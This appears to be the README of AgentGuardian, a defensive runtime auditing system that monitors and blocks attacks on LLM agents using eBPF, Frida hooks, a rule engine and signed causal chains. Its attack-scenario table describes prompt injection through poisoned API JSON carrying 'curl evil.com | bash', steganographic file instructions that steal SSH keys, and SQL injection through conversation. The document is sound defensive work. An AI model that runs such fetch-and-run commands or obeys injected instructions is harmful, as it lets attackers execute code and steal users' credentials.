# AgentGuardian

面向 LLM Agent 的零信任运行时安全审计系统。通过 **eBPF 内核监控** + **Frida 动态插桩** + **规则引擎审查** + **密码学因果链签名** 四层防线，实时检测和阻断针对智能体的提示注入、工具滥用和数据窃取攻击。

```
┌──────────────────────────────────────────────────────┐
│                  Dashboard (React/TS)                │
│         实时告警 · 调用链树 · 污点追踪 · 事件流        │
└──────────────────────┬─────────────────────────────┘
                       │ WebSocket + REST
┌──────────────────────▼─────────────────────────────┐
│              审计引擎 (FastAPI)                   │
│   模板匹配 · 图约束 · 污点传播 · 规则引擎 · 签名     │
└──────┬──────────────┬──────────────┬───────────────┘
       │              │              │
┌──────▼──────┐ ┌─────▼─────┐ ┌──────▼──────────────┐
│ causal-     │ │  Frida    │ │  Attacks             │
│ guardian    │ │  Bridge   │ │  恶意API · 隐写 ·    │
│ (Unix Sok)  │ │  (JS Hook)│ │  SQL注入              │
└──────┬──────┘ └───────────┘ └─────────────────────┘
       │
┌──────▼──────┐
│ eBPF 探针   │
│ execve/     │
│ openat/     │
│ connect     │
│ sendto      │
│ chmod       │
└─────────────┘
```

## 技术栈

| 层 | 技术 |
|---|------|
| 内核监控 | eBPF (libbpf, C), BPF CO-RE |
| 动态插桩 | Frida (Python bridge + JS hooks) |
| 审计引擎 | Python 3.11+, FastAPI, WebSocket |
| 可视化 | React 18, TypeScript, Vite, D3 |
| 攻击场景 | Flask, Pillow (LSB 隐写), PyPDF2, FPDF |

## 快速开始

**环境要求:** Linux 5.8+, Python 3.11+, `uv`, `pnpm`

```bash
# 安装依赖
uv sync
cd src/dashboard && pnpm install && cd ../..

# 启动引擎
make dev

# 另一个终端: 启动 Dashboard
cd src/dashboard && pnpm dev

# 健康检查
curl http://127.0.0.1:8000/health
# → {"status":"ok","rule_engine_available":true}
```

浏览器打开 `http://127.0.0.1:5173` 查看 Dashboard。

## 演示

```bash
# E2E 全链路验证 (含断言，会自动等待审计引擎就绪)
./scripts/demo_e2e.sh

# Dashboard 高危阻断告警演示 (生成可刷新回放的历史告警)
./scripts/demo_alert.sh

# eBPF 探针 + 集成测试 (需要 root)
./scripts/run_ebpf_tests.sh

# Frida 插桩验证 (需要 audit engine 运行中)
python scripts/verify_frida.py
```

## 目录结构

```
AgentGuardian/
├── config/                  # 任务模板、全局黑名单
├── scripts/                 # 演示和测试脚本
│   ├── demo_e2e.sh/.py      # E2E 全链路验证
│   ├── run_ebpf_tests.sh    # eBPF 集成测试
│   └── verify_frida.py      # Frida 最小验证
├── src/
│   ├── engine/              # 审计引擎
│   │   ├── server.py        # FastAPI 主服务
│   │   ├── rule_engine.py   # 规则引擎 (三层检测)
│   │   ├── graph_constraint.py  # 工具调用图约束
│   │   ├── taint_tracker.py # 污点传播追踪
│   │   ├── template_matcher.py  # MinHash 模板匹配
│   │   ├── hmac_signer.py   # HMAC 因果链签名
│   │   ├── key_manager.py   # 密钥管理与轮换
│   │   ├── sql_parser.py    # SQL 审计解析
│   │   └── stats_baseline.py # 统计基线
│   ├── ebpf/                # eBPF 内核探针 (C)
│   ├── causal_guardian/     # 因果链守护进程 (C)
│   ├── frida/               # Frida Hook 脚本
│   ├── attacks/             # 攻击场景构造
│   └── dashboard/           # React 可视化大屏
├── tests/                   # 单元测试 + 集成测试
│   └── integration/         # eBPF 集成测试
└── docs/                    # 设计文档 · 技术手册 · 任务跟踪
```

## Docker 部署

```bash
# 构建并启动所有服务 (engine + dashboard)
docker compose up -d

# 检查服务状态
docker compose ps
curl http://127.0.0.1:8000/health

# 浏览器访问
# Dashboard: http://127.0.0.1:5173
```

eBPF 探针和 causal-guardian 需在宿主机以 root 运行：

```bash
# 编译并加载 eBPF 探针
make -C src/ebpf && sudo ./src/ebpf/loader

# 另一终端: 启动因果链守护进程
make -C src/causal_guardian && sudo ./src/causal_guardian/causal-guardian
```

## 攻击场景

| 场景 | 攻击向量 | 防御层次 |
|------|---------|---------|
| 供应链 API 投毒 | 恶意 JSON 嵌入 `curl evil.com \| bash` | Frida 动态插桩层截获子进程 → 审计引擎污点追踪 (UNTRUSTED_API) → 规则引擎 → eBPF SIGKILL |
| 多模态文件隐写 | LSB/PDF 隐写指令窃取 SSH 密钥 | 审计引擎污点标记 (UNTRUSTED_FILE) → 图约束边界检测 → 规则引擎语义审查 |
| SQL 对话注入 | 社会工程 + DROP TABLE 绕过 | 审计引擎模板匹配 → SQL 词法解析 → DDL/DCL 检测 → 全局黑名单阻断 |

详细攻击脚本位于 `src/attacks/`，演示流程见 `scripts/demo_attacks.sh`。

## API 端点

| 方法 | 路径 | 说明 |
|------|------|------|
| POST | `/api/v1/causal-id/sign` | CausalID 签名请求 (核心端点) |
| POST | `/api/v1/taint/source` | 注册污点来源 |
| POST | `/api/v1/ebpf/intercept` | 接收 eBPF 拦截事件 |
| POST | `/api/v1/config/reload` | 热加载配置文件 |
| GET | `/api/v1/sessions/{id}/stats` | 查询会话统计 |
| GET | `/api/v1/sessions/{id}/graph` | 查询工具调用路径 |
| GET | `/api/v1/events/recent` | 查询最近 Dashboard 事件 |
| GET | `/health` | 健康检查 |
| WS | `/ws/events` | WebSocket 事件流 |

## 配置文件

`config/task_templates.json` 定义了任务模板、工具调用图和全局黑名单：

```jsonc
{
  "templates": [
    {
      "id": "db_query_optimization",
      "graph": { "db_query": ["summarize"] },
      "forbidden_tool_categories": ["DDL", "DCL"]  // 禁止的 SQL 操作类别
    }
  ],
  "global_blacklist": ["bash_exec", "file_delete", "config_modify"],
  "default_mode": "ask"  // ask / block / allow
}
```

配置修改后即时生效（inotify 热加载），无需重启服务。

## 运行测试

```bash
# 单元测试 + E2E 全量运行 (185 项；eBPF/Unix socket 相关用例仅在 Linux 自动执行)
make test

# E2E 集成测试 (8 个，三场景全链路)
uv run pytest tests/integration/test_e2e_chain.py -q

# Dashboard 生产构建
cd src/dashboard && pnpm build

# eBPF 集成测试 (需 root + 内核 eBPF)
./scripts/run_ebpf_tests.sh

# 代码静态检查
make lint

# 覆盖率报告
uv run pytest tests/ -v --cov=src/engine --cov-report=term-missing
```
